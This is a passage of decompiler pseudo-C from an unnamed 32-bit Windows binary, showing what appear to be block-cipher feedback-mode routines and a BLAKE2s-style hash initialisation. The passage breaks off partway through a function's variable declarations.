// 529BA8: using guessed type int dword_529BA8[64];
// 529CA8: using guessed type int dword_529CA8[64];
// 529DA8: using guessed type int dword_529DA8[64];
// 529EA8: using guessed type int dword_529EA8[64];
// 529FA8: using guessed type int dword_529FA8[64];
// 52A0A8: using guessed type int dword_52A0A8[64];
// 52A1A8: using guessed type int dword_52A1A8[65];

//----- (004BB1A0) --------------------------------------------------------
_BYTE *__cdecl sub_4BB1A0(const __m128i *Src, size_t Size, _BYTE *a3)
{
  _BYTE *v3; // esi
  _BYTE *result; // eax
  int v5[24]; // [esp+4h] [ebp-60h] BYREF

  v3 = a3;
  if ( !a3 )
    v3 = &unk_539350;
  result = (_BYTE *)sub_4C7000(v5);
  if ( result )
  {
    sub_444070((int)v5, Src, Size);
    sub_444150(v3, v5);
    sub_4139E0(v5, 0x60u);
    return v3;
  }
  return result;
}

//----- (004BB210) --------------------------------------------------------
_WORD *__cdecl sub_4BB210(unsigned __int16 *a1, _WORD *a2, _DWORD *a3, int a4)
{
  int v4; // edx
  __int16 v5; // ecx^2
  __int16 v6; // ecx^2
  _WORD *result; // eax
  int v8; // [esp+0h] [ebp-8h] BYREF
  int v9; // [esp+4h] [ebp-4h]

  v4 = *((unsigned __int8 *)a1 + 5);
  v8 = (*((unsigned __int8 *)a1 + 3) << 24) | (*((unsigned __int8 *)a1 + 2) << 16) | *a1;
  v9 = (v4 << 8) | *((unsigned __int8 *)a1 + 4) | (a1[3] << 16);
  sub_4B9240(&v8, a3, a4);
  v5 = HIWORD(v8);
  *a2 = v8;
  a2[1] = v5;
  v6 = HIWORD(v9);
  a2[2] = v9;
  result = a2 + 3;
  a2[3] = v6;
  return result;
}

//----- (004BB2C0) --------------------------------------------------------
int *__cdecl sub_4BB2C0(_BYTE *a1, _BYTE *a2, int a3, _DWORD *a4, unsigned __int16 *a5, int *a6)
{
  int v6; // esi
  int v7; // ecx
  int v8; // edx
  int v9; // ecx
  unsigned int v11; // edx
  int v12; // ebx
  int *result; // eax
  _BYTE *v14; // eax
  int v15; // ecx
  int v16; // [esp+10h] [ebp-28h]
  int v17; // [esp+18h] [ebp-20h]
  int v18; // [esp+1Ch] [ebp-1Ch] BYREF
  unsigned int v19; // [esp+20h] [ebp-18h]
  _DWORD *v20; // [esp+24h] [ebp-14h]
  _BYTE *v21; // [esp+28h] [ebp-10h]
  int v22; // [esp+2Ch] [ebp-Ch]
  unsigned int v23; // [esp+30h] [ebp-8h]

  v20 = a4;
  v6 = *a6;
  v17 = a3;
  v7 = *a5;
  v8 = *((unsigned __int8 *)a5 + 2);
  v21 = (char *)a5 + 1;
  v9 = (*((unsigned __int8 *)a5 + 3) << 24) | (v8 << 16) | v7;
  v11 = *((_DWORD *)a5 + 1);
  v12 = v9;
  v22 = v9;
  v19 = v11;
  v23 = v11;
  result = (int *)HIWORD(v11);
  v16 = 0;
  v18 = v9;
  if ( a3 )
  {
    do
    {
      --v17;
      if ( !v6 )
      {
        sub_4B9240(&v18, v20, 1);
        v12 = v18;
        v23 = v19;
        ++v16;
        v22 = v18;
      }
      *a2 = *a1 ^ *((_BYTE *)&v22 + v6);
      result = (int *)(a1 + 1);
      ++a2;
      v6 = ((_BYTE)v6 + 1) & 7;
      ++a1;
    }
    while ( v17 );
    if ( v16 )
    {
      v14 = v21;
      *(_BYTE *)a5 = v12;
      *v14++ = BYTE1(v12);
      *v14 = BYTE2(v12);
      v15 = v19;
      *++v14 = HIBYTE(v12);
      v14[1] = v15;
      v14 += 2;
      *v14++ = BYTE1(v15);
      *v14 = BYTE2(v15);
      v14[1] = HIBYTE(v15);
      result = a6;
    }
    *a6 = v6;
  }
  else
  {
    *a6 = v6;
  }
  return result;
}

//----- (004BB4B0) --------------------------------------------------------
int *__cdecl sub_4BB4B0(char *a1, _BYTE *a2, int a3, _DWORD *a4, unsigned __int16 *a5, int *a6, int a7)
{
  int *result; // eax
  int v8; // ebp
  int v9; // esi
  int v10; // edx
  unsigned __int16 v11; // ecx^2
  unsigned __int16 v12; // ecx^2
  char v13; // al
  int v14; // edx
  unsigned __int16 v15; // ecx^2
  unsigned __int16 v16; // ecx^2
  char v17; // al
  char v18; // cl
  int v19; // [esp+10h] [ebp-8h] BYREF
  int v20; // [esp+14h] [ebp-4h]

  result = a6;
  v8 = a3;
  v9 = *a6;
  if ( !a7 )
  {
    if ( a3 )
    {
      do
      {
        --v8;
        if ( !v9 )
        {
          v14 = *((unsigned __int8 *)a5 + 5);
          v19 = (*((unsigned __int8 *)a5 + 3) << 24) | (*((unsigned __int8 *)a5 + 2) << 16) | *a5;
          v20 = (v14 << 8) | *((unsigned __int8 *)a5 + 4) | (a5[3] << 16);
          sub_4B9240(&v19, a4, 1);
          v15 = HIWORD(v19);
          *a5 = v19;
          a5[1] = v15;
          v16 = HIWORD(v20);
          a5[2] = v20;
          a5[3] = v16;
        }
        v17 = *a1++;
        v18 = *((_BYTE *)a5 + v9);
        *((_BYTE *)a5 + v9) = v17;
        *a2 = v18 ^ v17;
        v9 = ((_BYTE)v9 + 1) & 7;
        ++a2;
      }
      while ( v8 );
      result = a6;
    }
    goto LABEL_12;
  }
  if ( !a3 )
  {
LABEL_12:
    *result = v9;
    return result;
  }
  do
  {
    --v8;
    if ( !v9 )
    {
      v10 = *((unsigned __int8 *)a5 + 5);
      v19 = (*((unsigned __int8 *)a5 + 3) << 24) | (*((unsigned __int8 *)a5 + 2) << 16) | *a5;
      v20 = (v10 << 8) | *((unsigned __int8 *)a5 + 4) | (a5[3] << 16);
      sub_4B9240(&v19, a4, 1);
      v11 = HIWORD(v19);
      *a5 = v19;
      a5[1] = v11;
      v12 = HIWORD(v20);
      a5[2] = v20;
      a5[3] = v12;
    }
    v13 = *((_BYTE *)a5 + v9) ^ *a1++;
    *a2 = v13;
    *((_BYTE *)a5 + v9) = v13;
    v9 = ((_BYTE)v9 + 1) & 7;
    ++a2;
  }
  while ( v8 );
  result = a6;
  *a6 = v9;
  return result;
}

//----- (004BB6A0) --------------------------------------------------------
int __cdecl sub_4BB6A0(int a1, int a2, int a3, unsigned int a4, _DWORD *a5, unsigned __int8 *a6, int a7)
{
  unsigned int v8; // ebp
  int result; // eax
  int v10; // ebx
  int v11; // ecx
  int v12; // edi
  int v13; // esi
  int v14; // esi
  int v15; // ecx
  int v16; // eax
  int v17; // ecx
  int v18; // eax
  int v19; // edx
  int v20; // eax
  int v21; // eax
  int v22; // edx
  int v23; // edx
  int v24; // edx
  int v25; // eax
  int v26; // ecx
  int v27; // edi
  int v28; // ecx
  int v29; // edi
  int v30; // esi
  int v31; // eax
  int v32; // esi
  int v33; // ebx
  int v34; // eax
  int v35; // edx
  int v36; // ecx
  int v37; // edx
  int v38; // ebx
  int v39; // ecx
  int v40; // edx
  int v41; // ecx
  int v42; // ebx
  int v43; // eax
  int v44; // edi
  int v45; // [esp+8h] [ebp-30h]
  int v46; // [esp+Ch] [ebp-2Ch]
  int v47; // [esp+10h] [ebp-28h]
  int v48; // [esp+10h] [ebp-28h]
  unsigned int v49; // [esp+14h] [ebp-24h]
  int v50; // [esp+18h] [ebp-20h]
  int v51; // [esp+20h] [ebp-18h] BYREF
  int v52; // [esp+24h] [ebp-14h]
  int Src; // [esp+28h] [ebp-10h] BYREF
  int v54; // [esp+2Ch] [ebp-Ch]
  int v55; // [esp+30h] [ebp-8h]
  int v56; // [esp+34h] [ebp-4h]
  int v57; // [esp+48h] [ebp+10h]

  v45 = a3 / 8;
  v8 = (a3 + 7) / 8;
  v49 = a4;
  result = a3 % 8;
  v46 = a3 % 8;
  if ( (unsigned int)(a3 - 1) <= 0x3F )
  {
    v10 = (a6[3] << 24) | (a6[2] << 16) | (a6[1] << 8) | *a6;
    v11 = *((_DWORD *)a6 + 1);
    v47 = v10;
    v57 = v11;
    if ( a7 )
    {
      if ( a4 >= v8 )
      {
        v12 = a2;
        v13 = a1;
        while ( 1 )
        {
          v49 -= v8;
          v52 = v11;
          v51 = v10;
          sub_4B9240(&v51, a5, 1);
          v14 = v8 + v13;
          v15 = 0;
          v16 = 0;
          switch ( v8 )
          {
            case 1u:
              goto LABEL_13;
            case 2u:
              goto LABEL_12;
            case 3u:
              goto LABEL_11;
            case 4u:
              goto LABEL_10;
            case 5u:
              goto LABEL_9;
            case 6u:
              goto LABEL_8;
            case 7u:
              goto LABEL_7;
            case 8u:
              v17 = *(unsigned __int8 *)--v14;
              v15 = v17 << 24;
LABEL_7:
              v18 = *(unsigned __int8 *)--v14;
              v15 |= v18 << 16;
LABEL_8:
              v19 = *(unsigned __int8 *)--v14;
              v15 |= v19 << 8;
LABEL_9:
              v20 = *(unsigned __int8 *)--v14;
              v15 |= v20;
LABEL_10:
              v21 = *(unsigned __int8 *)--v14;
              v16 = v21 << 24;
LABEL_11:
              v22 = *(unsigned __int8 *)--v14;
              v16 |= v22 << 16;
LABEL_12:
              v23 = *(unsigned __int8 *)--v14;
              v16 |= v23 << 8;
LABEL_13:
              v24 = *(unsigned __int8 *)--v14;
              v16 |= v24;
              break;
            default:
              break;
          }
          v25 = v51 ^ v16;
          v26 = v52 ^ v15;
          v13 = v8 + v14;
          v27 = v8 + v12;
          switch ( v8 )
          {
            case 1u:
              goto LABEL_22;
            case 2u:
              goto LABEL_21;
            case 3u:
              goto LABEL_20;
            case 4u:
              goto LABEL_19;
            case 5u:
              goto LABEL_18;
            case 6u:
              goto LABEL_17;
            case 7u:
              goto LABEL_16;
            case 8u:
              *(_BYTE *)--v27 = HIBYTE(v26);
LABEL_16:
              *(_BYTE *)--v27 = BYTE2(v26);
LABEL_17:
              *(_BYTE *)--v27 = BYTE1(v26);
LABEL_18:
              *(_BYTE *)--v27 = v26;
LABEL_19:
              *(_BYTE *)--v27 = HIBYTE(v25);
LABEL_20:
              *(_BYTE *)--v27 = BYTE2(v25);
LABEL_21:
              *(_BYTE *)--v27 = BYTE1(v25);
LABEL_22:
              *(_BYTE *)--v27 = v25;
              break;
            default:
              break;
          }
          v12 = v8 + v27;
          if ( a3 == 32 )
            break;
          if ( a3 != 64 )
          {
            v56 = v26;
            Src = v10;
            v54 = v57;
            v55 = v25;
            if ( v46 )
            {
              LOBYTE(Src) = (*((_BYTE *)&Src + v45) << v46) | (*((_BYTE *)&Src + v45 + 1) >> (8 - v46));
              BYTE1(Src) = (*((_BYTE *)&Src + v45 + 2) >> (8 - v46)) | (*((_BYTE *)&Src + v45 + 1) << v46);
              BYTE2(Src) = (*((_BYTE *)&Src + v45 + 3) >> (8 - v46)) | (*((_BYTE *)&Src + v45 + 2) << v46);
              HIBYTE(Src) = (*((_BYTE *)&Src + v45 + 3) << v46) | (*((_BYTE *)&v54 + v45) >> (8 - v46));
              LOBYTE(v54) = (*((_BYTE *)&v54 + v45 + 1) >> (8 - v46)) | (*((_BYTE *)&v54 + v45) << v46);
              BYTE1(v54) = (*((_BYTE *)&v54 + v45 + 2) >> (8 - v46)) | (*((_BYTE *)&v54 + v45 + 1) << v46);
              BYTE2(v54) = (*((_BYTE *)&v54 + v45 + 3) >> (8 - v46)) | (*((_BYTE *)&v54 + v45 + 2) << v46);
              HIBYTE(v54) = (*((_BYTE *)&v54 + v45 + 3) << v46) | (*((_BYTE *)&v55 + v45) >> (8 - v46));
            }
            else
            {
              memcpy_0(&Src, (char *)&Src + v45, 8u);
            }
            v28 = Src;
            v57 = v54;
            goto LABEL_31;
          }
          v48 = v25;
          v57 = v26;
LABEL_32:
          v10 = v48;
          v11 = v57;
          if ( v49 < v8 )
            goto LABEL_63;
        }
        v28 = v57;
        v57 = v25;
LABEL_31:
        v48 = v28;
        goto LABEL_32;
      }
    }
    else if ( a4 >= v8 )
    {
      v29 = a2;
      v30 = a1;
      do
      {
        v49 -= v8;
        v52 = v11;
        v51 = v10;
        sub_4B9240(&v51, a5, 1);
        v31 = 0;
        v32 = v8 + v30;
        v33 = 0;
        v50 = 0;
        switch ( v8 )
        {
          case 1u:
            goto LABEL_44;
          case 2u:
            goto LABEL_43;
          case 3u:
            goto LABEL_42;
          case 4u:
            goto LABEL_41;
          case 5u:
            goto LABEL_40;
          case 6u:
            goto LABEL_39;
          case 7u:
            goto LABEL_38;
          case 8u:
            v34 = *(unsigned __int8 *)--v32;
            v31 = v34 << 24;
LABEL_38:
            v35 = *(unsigned __int8 *)--v32;
            v31 |= v35 << 16;
LABEL_39:
            v36 = *(unsigned __int8 *)--v32;
            v31 |= v36 << 8;
LABEL_40:
            v37 = *(unsigned __int8 *)--v32;
            v31 |= v37;
            v50 = v31;
LABEL_41:
            v38 = *(unsigned __int8 *)--v32;
            v33 = v38 << 24;
LABEL_42:
            v39 = *(unsigned __int8 *)--v32;
            v33 |= v39 << 16;
LABEL_43:
            v40 = *(unsigned __int8 *)--v32;
            v33 |= v40 << 8;
LABEL_44:
            v41 = *(unsigned __int8 *)--v32;
            v33 |= v41;
            break;
          default:
            break;
        }
        v30 = v8 + v32;
        if ( a3 == 32 )
        {
          v47 = v57;
          v57 = v33;
        }
        else if ( a3 == 64 )
        {
          v47 = v33;
          v57 = v31;
        }
        else
        {
          v56 = v31;
          Src = v47;
          v54 = v57;
          v55 = v33;
          if ( v46 )
          {
            LOBYTE(Src) = (*((_BYTE *)&Src + v45) << v46) | (*((_BYTE *)&Src + v45 + 1) >> (8 - v46));
            BYTE1(Src) = (*((_BYTE *)&Src + v45 + 2) >> (8 - v46)) | (*((_BYTE *)&Src + v45 + 1) << v46);
            BYTE2(Src) = (*((_BYTE *)&Src + v45 + 3) >> (8 - v46)) | (*((_BYTE *)&Src + v45 + 2) << v46);
            HIBYTE(Src) = (*((_BYTE *)&Src + v45 + 3) << v46) | (*((_BYTE *)&v54 + v45) >> (8 - v46));
            LOBYTE(v54) = (*((_BYTE *)&v54 + v45 + 1) >> (8 - v46)) | (*((_BYTE *)&v54 + v45) << v46);
            BYTE1(v54) = (*((_BYTE *)&v54 + v45 + 2) >> (8 - v46)) | (*((_BYTE *)&v54 + v45 + 1) << v46);
            BYTE2(v54) = (*((_BYTE *)&v54 + v45 + 3) >> (8 - v46)) | (*((_BYTE *)&v54 + v45 + 2) << v46);
            HIBYTE(v54) = (*((_BYTE *)&v54 + v45 + 3) << v46) | (*((_BYTE *)&v55 + v45) >> (8 - v46));
          }
          else
          {
            memcpy_0(&Src, (char *)&Src + v45, 8u);
          }
          v31 = v50;
          v47 = Src;
          v57 = v54;
        }
        v42 = v51 ^ v33;
        v43 = v52 ^ v31;
        v44 = v8 + v29;
        switch ( v8 )
        {
          case 1u:
            goto LABEL_61;
          case 2u:
            goto LABEL_60;
          case 3u:
            goto LABEL_59;
          case 4u:
            goto LABEL_58;
          case 5u:
            goto LABEL_57;
          case 6u:
            goto LABEL_56;
          case 7u:
            goto LABEL_55;
          case 8u:
            *(_BYTE *)--v44 = HIBYTE(v43);
LABEL_55:
            *(_BYTE *)--v44 = BYTE2(v43);
LABEL_56:
            *(_BYTE *)--v44 = BYTE1(v43);
LABEL_57:
            *(_BYTE *)--v44 = v43;
LABEL_58:
            *(_BYTE *)--v44 = HIBYTE(v42);
LABEL_59:
            *(_BYTE *)--v44 = BYTE2(v42);
LABEL_60:
            *(_BYTE *)--v44 = BYTE1(v42);
LABEL_61:
            *(_BYTE *)--v44 = v42;
            break;
          default:
            break;
        }
        v10 = v47;
        v11 = v57;
        v29 = v8 + v44;
      }
      while ( v49 >= v8 );
    }
LABEL_63:
    *(_DWORD *)a6 = v10;
    *((_DWORD *)a6 + 1) = v11;
    return (int)(a6 + 6);
  }
  return result;
}

//----- (004BBCE0) --------------------------------------------------------
unsigned __int16 *__cdecl sub_4BBCE0(
        unsigned __int8 *a1,
        _BYTE *a2,
        unsigned int a3,
        _DWORD *a4,
        unsigned __int16 *a5,
        unsigned __int16 *a6,
        unsigned __int8 *a7,
        int a8)
{
  int v8; // ecx
  int v9; // edx
  unsigned __int8 *v10; // edi
  int v11; // eax
  unsigned int v12; // ecx
  unsigned int v13; // ebp
  _BYTE *v14; // esi
  int v15; // edx
  int v16; // ebx
  unsigned __int8 *v17; // edi
  int v18; // edx
  int v19; // ebx
  int v20; // edx
  int v21; // ebx
  int v22; // edx
  int v23; // ebx
  int v24; // ebp
  int v25; // ebx
  int v26; // ebp
  int v27; // ebx
  int v28; // ebp
  _BYTE *v29; // esi
  int v30; // edi
  int v31; // ebx
  int v32; // edx
  int v33; // ebx
  int v34; // edx
  int v35; // edx
  int v36; // edx
  int v37; // edx
  int v38; // ebp
  int v39; // ebp
  _BYTE *v40; // esi
  _BYTE *v42; // edi
  int v43; // ebx
  int v44; // edx
  unsigned __int8 *v45; // esi
  int v46; // eax
  int v47; // ebp
  int v48; // eax
  unsigned __int8 *v49; // esi
  int v50; // edx
  int v51; // ebp
  int v52; // eax
  int v53; // ebp
  int v54; // eax
  int v55; // edx
  int v56; // ecx
  int v57; // edx
  int v58; // ecx
  int v59; // eax
  _BYTE *v60; // edi
  bool v61; // zf
  int v62; // ebp
  int v63; // edx
  unsigned __int8 *v64; // esi
  int v65; // eax
  int v66; // ebp
  int v67; // ebx
  int v68; // eax
  int v69; // edi
  int v70; // [esp+10h] [ebp-1Ch]
  int v71; // [esp+14h] [ebp-18h]
  int v72; // [esp+18h] [ebp-14h]
  unsigned int v73; // [esp+20h] [ebp-Ch]
  int v74; // [esp+24h] [ebp-8h] BYREF
  unsigned int v75; // [esp+28h] [ebp-4h]
  unsigned int v76; // [esp+38h] [ebp+Ch]
  unsigned int v77; // [esp+38h] [ebp+Ch]
  unsigned int v78; // [esp+44h] [ebp+18h]
  int v79; // [esp+44h] [ebp+18h]
  int v80; // [esp+48h] [ebp+1Ch]
  int v81; // [esp+4Ch] [ebp+20h]
  int v82; // [esp+4Ch] [ebp+20h]

  v71 = (*((unsigned __int8 *)a6 + 3) << 24) | (*((unsigned __int8 *)a6 + 2) << 16) | *a6;
  v72 = (a6[3] << 16) | (*((unsigned __int8 *)a6 + 5) << 8) | *((unsigned __int8 *)a6 + 4);
  v8 = (a7[3] << 24) | (a7[2] << 16) | (a7[1] << 8) | *a7;
  v9 = *((_DWORD *)a7 + 1);
  v80 = v8;
  v70 = v9;
  if ( a8 )
  {
    v10 = a1;
    v11 = (*((unsigned __int8 *)a5 + 3) << 24) | (*((unsigned __int8 *)a5 + 2) << 16) | *a5;
    v12 = *((_DWORD *)a5 + 1);
    v13 = a3 - 8;
    v14 = a2;
    if ( (int)(a3 - 8) >= 0 )
    {
      v78 = a3 >> 3;
      v76 = v13 - 8 * (a3 >> 3);
      do
      {
        v15 = *v10;
        v16 = v10[1];
        v17 = v10 + 1;
        v18 = (v16 << 8) | v15;
        v19 = *++v17;
        v20 = (v19 << 16) | v18;
        v21 = *++v17;
        v22 = (v21 << 24) | v20;
        v23 = *++v17;
        v24 = *++v17;
        v25 = (v24 << 8) | v23;
        v26 = *++v17;
        v27 = (v26 << 16) | v25;
        v28 = v17[1];
        v10 = v17 + 2;
        v74 = v71 ^ v11 ^ v22;
        v75 = v72 ^ v12 ^ ((v28 << 24) | v27);
        sub_4B9240(&v74, a4, 1);
        v11 = v80 ^ v74;
        v29 = v14 + 1;
        *(v29++ - 1) = v80 ^ v74;
        *(v29 - 1) = BYTE1(v11);
        *v29 = BYTE2(v11);
        v12 = v70 ^ v75;
        *++v29 = HIBYTE(v11);
        *++v29 = v12;
        *++v29 = BYTE1(v12);
        *++v29 = BYTE2(v12);
        *++v29 = HIBYTE(v12);
        v14 = v29 + 1;
        --v78;
      }
      while ( v78 );
      v13 = v76;
    }
    if ( v13 != -8 )
    {
      v30 = (int)&v10[v13 + 8];
      v31 = 0;
      v32 = 0;
      switch ( v13 )
      {
        case 0xFFFFFFF9:
          goto LABEL_15;
        case 0xFFFFFFFA:
          goto LABEL_14;
        case 0xFFFFFFFB:
          goto LABEL_13;
        case 0xFFFFFFFC:
          goto LABEL_12;
        case 0xFFFFFFFD:
          goto LABEL_11;
        case 0xFFFFFFFE:
          goto LABEL_10;
        case 0xFFFFFFFF:
          goto LABEL_9;
        case 0u:
          v33 = *(unsigned __int8 *)--v30;
          v31 = v33 << 24;
LABEL_9:
          v34 = *(unsigned __int8 *)--v30;
          v31 |= v34 << 16;
LABEL_10:
          v35 = *(unsigned __int8 *)--v30;
          v31 |= v35 << 8;
LABEL_11:
          v36 = *(unsigned __int8 *)--v30;
          v31 |= v36;
LABEL_12:
          v37 = *(unsigned __int8 *)--v30;
          v32 = v37 << 24;
LABEL_13:
          v38 = *(unsigned __int8 *)--v30;
          v32 |= v38 << 16;
LABEL_14:
          v39 = *(unsigned __int8 *)--v30;
          v32 |= v39 << 8;
LABEL_15:
          v32 |= *(unsigned __int8 *)(v30 - 1);
          break;
        default:
          break;
      }
      v74 = v71 ^ v11 ^ v32;
      v75 = v72 ^ v12 ^ v31;
      sub_4B9240(&v74, a4, 1);
      v11 = v80 ^ v74;
      v40 = v14 + 1;
      *(_WORD *)(v40++ - 1) = v80 ^ v74;
      *v40 = BYTE2(v11);
      v12 = v70 ^ v75;
      *++v40 = HIBYTE(v11);
      *++v40 = v12;
      *++v40 = BYTE1(v12);
      *++v40 = BYTE2(v12);
      v40[1] = HIBYTE(v12);
    }
    *(_DWORD *)a5 = v11;
    *((_DWORD *)a5 + 1) = v12;
    return (unsigned __int16 *)(v12 >> 8);
  }
  else
  {
    v42 = a2;
    v43 = (*((unsigned __int8 *)a5 + 3) << 24) | (*((unsigned __int8 *)a5 + 2) << 16) | (*((unsigned __int8 *)a5 + 1) << 8) | *(unsigned __int8 *)a5;
    v44 = *((_DWORD *)a5 + 1);
    v45 = a1;
    v46 = a3 - 8;
    v79 = v44;
    v77 = v46;
    if ( v46 > 0 )
    {
      v73 = ((unsigned int)(v46 - 1) >> 3) + 1;
      v77 = v46 - 8 * v73;
      do
      {
        v47 = *v45;
        v48 = v45[1];
        v49 = v45 + 1;
        v50 = v49[1];
        v51 = (v48 << 8) | v47;
        v52 = (++v49)[1];
        ++v49;
        v53 = (v52 << 24) | (v50 << 16) | v51;
        v54 = v49[1];
        v49 += 2;
        v55 = v8 ^ v53;
        v56 = *v49;
        v74 = v55;
        v57 = *++v49;
        v81 = (v49[1] << 24) | (v57 << 16) | (v56 << 8) | v54;
        v75 = v70 ^ v81;
        v45 = v49 + 2;
        sub_4B9240(&v74, a4, 0);
        v58 = v72 ^ v75 ^ v79;
        v59 = v71 ^ v74 ^ v43;
        v60 = v42 + 1;
        *(_WORD *)(v60++ - 1) = v59;
        *v60++ = BYTE2(v59);
        *v60 = HIBYTE(v59);
        v60[1] = v58;
        v60 += 2;
        *v60++ = BYTE1(v58);
        *v60++ = BYTE2(v58);
        *v60 = HIBYTE(v58);
        v8 = v80;
        v42 = v60 + 1;
        v61 = v73-- == 1;
        v43 = v53;
        v79 = v81;
      }
      while ( !v61 );
      v44 = v81;
      v46 = v77;
    }
    if ( v46 != -8 )
    {
      v62 = *v45;
      v63 = v45[1];
      v64 = v45 + 1;
      v65 = *++v64;
      v66 = (v64[1] << 24) | (v65 << 16) | (v63 << 8) | v62;
      v74 = v8 ^ v66;
      v82 = ((v64[4] | (v64[5] << 8)) << 16) | (v64[3] << 8) | v64[2];
      v75 = v70 ^ v82;
      sub_4B9240(&v74, a4, 0);
      v67 = v71 ^ v74 ^ v43;
      v68 = v72 ^ v75 ^ v79;
      v69 = (int)&v42[v77 + 8];
      switch ( v77 )
      {
        case 0xFFFFFFF9:
          goto LABEL_31;
        case 0xFFFFFFFA:
          goto LABEL_30;
        case 0xFFFFFFFB:
          goto LABEL_29;
        case 0xFFFFFFFC:
          goto LABEL_28;
        case 0xFFFFFFFD:
          goto LABEL_27;
        case 0xFFFFFFFE:
          goto LABEL_26;
        case 0xFFFFFFFF:
          goto LABEL_25;
        case 0u:
          *(_BYTE *)--v69 = HIBYTE(v68);
LABEL_25:
          *(_BYTE *)--v69 = BYTE2(v68);
LABEL_26:
          *(_BYTE *)--v69 = BYTE1(v68);
LABEL_27:
          *(_BYTE *)--v69 = v68;
LABEL_28:
          *(_BYTE *)--v69 = HIBYTE(v67);
LABEL_29:
          *(_BYTE *)--v69 = BYTE2(v67);
LABEL_30:
          *(_BYTE *)--v69 = BYTE1(v67);
LABEL_31:
          *(_BYTE *)(v69 - 1) = v67;
          break;
        default:
          break;
      }
      v44 = v82;
      v43 = v66;
    }
    *(_DWORD *)a5 = v43;
    *((_DWORD *)a5 + 1) = v44;
    return a5 + 3;
  }
}

//----- (004BC2A0) --------------------------------------------------------
int __usercall sub_4BC2A0@<eax>(_DWORD *a1@<ecx>, _DWORD *a2@<esi>)
{
  int result; // eax

  memset(a2, 0, 0x74u);
  *a2 = 1779033703;
  a2[1] = -1150833019;
  a2[2] = 1013904242;
  a2[3] = -1521486534;
  a2[4] = 1359893119;
  a2[5] = -1694144372;
  a2[6] = 528734635;
  a2[7] = 1541459225;
  *a2 ^= *a1;
  a2[1] ^= a1[1];
  a2[2] ^= a1[2];
  a2[3] ^= a1[3];
  a2[4] ^= a1[4];
  a2[5] ^= a1[5];
  result = a1[6];
  a2[6] ^= result;
  a2[7] ^= a1[7];
  return result;
}

//----- (004BC3B0) --------------------------------------------------------
int __cdecl sub_4BC3B0(int *a1, int a2, unsigned int a3)
{
  int v3; // ebp
  int v4; // eax
  int v5; // ecx
  int v6; // edx
  int v7; // esi
  int v8; // edi
  _DWORD *v9; // edi
  unsigned int v10; // ebx
  int v11; // ebp
  unsigned int v12; // ebp
  unsigned int v13; // ebx
  int v14; // edi
  int v15; // eax
  int v16; // ebp
  int v17; // eax
  int v18; // ebx
  int v19; // edi
  int v20; // ecx
  int v21; // ebp
  int v22; // ecx
  unsigned int v23; // ebx
  int v24; // ebp
  int v25; // edx
  int v26; // ebx
  int v27; // ebp
  int v28; // edx
  int v29; // ebp
  int v30; // ebx
  int v31; // ebp
  int v32; // esi
  int v33; // ebp
  int v34; // esi
  int v35; // ebx
  int v36; // eax
  int v37; // ebx
  int v38; // ebp
  int v39; // eax
  int v40; // ebx
  int v41; // ebp
  int v42; // ecx
  int v43; // ecx
  int v44; // ebx
  int v45; // ebp
  int v46; // edx
  unsigned int v47; // edi
  int v48; // edx
  unsigned int v49; // edi
  int v50; // esi
  int v51; // ebx
  int v52; // ebp
  int v53; // esi
  int v54; // ebx
  int v55; // ebp
  int v56; // eax
  int v57; // edi
  int v58; // eax
  int v59; // edi
  int v60; // ecx
  int v61; // ebx
  int v62; // ebp
  int v63; // ecx
  unsigned int v64; // ebx
  int v65; // ebp
  int v66; // edx
  int v67; // ebx
  int v68; // ebp
  int v69; // edx
  int v70; // ebx
  int v71; // ebp
  int v72; // esi
  int v73; // ebx
  int v74; // ebp
  int v75; // esi
  int v76; // ebx
  int v77; // ebp
  int v78; // eax
  int v79; // ebx
  int v80; // ebp
  int v81; // eax
  int v82; // ebx
  int v83; // ebp
  int v84; // ecx
  int v85; // ebx
  int v86; // ecx
  int v87; // edx
  int v88; // ebx
  int v89; // edi
  int v90; // edx
  unsigned int v91; // ebx
  int v92; // edi
  int v93; // esi
  int v94; // ebx
  int v95; // ebp
  int v96; // esi
  int v97; // ebx
  int v98; // ebp
  int v99; // eax
  int v100; // edi
  int v101; // eax
  int v102; // edi
  int v103; // ecx
  int v104; // ebx
  int v105; // ebp
  int v106; // ecx
  unsigned int v107; // ebx
  int v108; // ebp
  int v109; // edx
  int v110; // ebx
  int v111; // ebp
  int v112; // edx
  int v113; // ebx
  int v114; // ebp
  int v115; // esi
  int v116; // ebx
  int v117; // ebp
  int v118; // ebx
  int v119; // esi
  int v120; // eax
  int v121; // ebx
  int v122; // ebp
  int v123; // eax
  int v124; // ebx
  int v125; // ebp
  int v126; // ecx
  int v127; // ebx
  int v128; // ebp
  int v129; // ecx
  int v130; // ebx
  int v131; // ebp
  int v132; // edx
  int v133; // edi
  int v134; // edx
  int v135; // edi
  int v136; // esi
  int v137; // ebx
  int v138; // ebp
  int v139; // esi
  int v140; // ebx
  int v141; // ebp
  int v142; // eax
  int v143; // edi
  int v144; // eax
  int v145; // edi
  int v146; // ecx
  unsigned int v147; // ebx
  int v148; // ebp
  int v149; // ebx
  int v150; // ecx
  int v151; // ebp
  int v152; // edx
  int v153; // ebx
  int v154; // ebp
  int v155; // edx
  int v156; // ebx
  int v157; // ebp
  int v158; // esi
  int v159; // ebx
  int v160; // ebp
  int v161; // esi
  int v162; // ebx
  int v163; // ebp
  int v164; // eax
  int v165; // ebx
  int v166; // ebp
  int v167; // eax
  int v168; // ebx
  int v169; // ebp
  int v170; // ecx
  int v171; // ebx
  int v172; // ebp
  int v173; // ecx
  int v174; // ebx
  int v175; // ebp
  int v176; // edx
  int v177; // edi
  int v178; // edx
  int v179; // edi
  int v180; // esi
  int v181; // ebx
  int v182; // ebp
  int v183; // esi
  int v184; // ebx
  int v185; // ebp
  int v186; // eax
  int v187; // edi
  int v188; // eax
  int v189; // edi
  int v190; // ecx
  int v191; // ebx
  int v192; // ebp
  int v193; // ecx
  unsigned int v194; // ebx
  int v195; // ebp
  int v196; // edx
  int v197; // ebx
  int v198; // ebp
  int v199; // edx
  int v200; // ebx
  int v201; // ebp
  int v202; // esi
  int v203; // ebx
  int v204; // ebp
  int v205; // esi
  int v206; // ebx
  int v207; // ebp
  int v208; // eax
  int v209; // ebx
  int v210; // ebp
  int v211; // eax
  int v212; // ebx
  int v213; // ebp
  int v214; // ecx
  int v215; // ecx
  int v216; // ebx
  int v217; // ebp
  int v218; // edx
  int v219; // edi
  int v220; // edx
  int v221; // edi
  int v222; // esi
  int v223; // ebx
  int v224; // ebp
  int v225; // esi
  int v226; // ebx
  int v227; // ebp
  int v228; // eax
  int v229; // ebx
  int v230; // edi
  int v231; // eax
  int v232; // ebx
  int v233; // edi
  int v234; // ecx
  int v235; // ebx
  int v236; // ebp
